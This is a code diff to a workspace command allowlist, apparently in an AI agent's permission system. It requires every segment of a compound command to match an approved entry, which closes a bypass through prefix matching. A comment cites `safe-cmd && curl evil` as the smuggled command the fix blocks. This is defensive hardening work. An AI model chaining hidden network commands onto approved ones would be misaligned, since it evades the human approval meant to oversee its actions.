@@ -8,6 +8,7 @@ import {
 } from '../../contracts/action-level.js'
 import { workspaceHash } from '../../context-engine/workspace-ledger.js'
 import { normalizeCommand } from '../../telemetry/target-normalization.js'
+import { splitCommandSegments } from './action-classifier.js'
 
 export class WorkspaceAllowlistStore {
   constructor(
@@ -22,9 +23,16 @@ export class WorkspaceAllowlistStore {
     if (!workspace.trim()) return false
     const normalized = normalizeCommand(command)
     const file = await this.load(workspace)
-    return file.entries.some((entry) =>
-      entry.level <= maxLevel &&
-      normalizedStartsWithPattern(normalized, entry.pattern)
+    const eligible = file.entries.filter((entry) => entry.level <= maxLevel)
+    // A compound command only matches an entry wholesale when it is
+    // byte-identical; otherwise EVERY segment must match some entry.
+    // Prefix-matching the full compound against a single pattern would
+    // let `safe-cmd && curl evil` ride on a remembered `safe-cmd`.
+    if (eligible.some((entry) => entry.pattern === normalized)) return true
+    const segments = splitCommandSegments(normalized)
+    if (segments.length === 0) return false
+    return segments.every((segment) =>
+      eligible.some((entry) => normalizedStartsWithPattern(segment, entry.pattern))
     )
   }
 
